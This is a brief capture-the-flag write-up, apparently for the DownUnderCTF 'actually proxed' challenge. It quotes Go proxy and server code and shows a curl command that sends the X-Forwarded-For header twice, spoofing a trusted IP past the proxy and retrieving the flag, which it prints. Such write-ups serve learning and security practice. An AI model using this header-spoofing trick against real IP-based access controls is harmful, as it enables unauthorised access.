Similar to the beginners version, but this time there's a proxy server up front, which I think prunes the `X-forwarded-for` header trick that worked for the first one, based on this code fragment:

```go

	for i, v := range headers {
		if strings.ToLower(v[0]) == "x-forwarded-for" {
			headers[i][1] = fmt.Sprintf("%s, %s", v[1], clientIP)
			break
		}
	}
```

However, in the "secret server", by itself, that old exploit could still work if we somehow shoved it past the proxy:
```go
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		xff := r.Header.Values("X-Forwarded-For")

		ip := strings.Split(r.RemoteAddr, ":")[0]

		if xff != nil {
			ips := strings.Split(xff[len(xff)-1], ", ")
			ip = ips[len(ips)-1]
			ip = strings.TrimSpace(ip)
		}

		// 1337 hax0rz 0nly!
		if ip != "31.33.33.7" {
			message := fmt.Sprintf("untrusted IP: %s", ip)
			http.Error(w, message, http.StatusForbidden)
			return
		} else {
			w.Write([]byte(os.Getenv("FLAG")))
		}
```

Now I'm not entirely sure how this works, but I was able to get the flag by `curl` request and passing the same `X-Forwarded-for` header **twice**, like so:
`curl -H "X-forwarded-for: aksldksaj" -H "X-forwarded-for: 31.33.33.7" http://actually.proxed.duc.tf:30009`
And this gave back the flag

I believe this works because the "pruning" code mentioned above only prunes the first instance of this header, due to the subsequent `break` statement.

Flag: `DUCTF{y0ur_c0d3_15_n07_b3773r_7h4n_7h3_574nd4rd_l1b}`

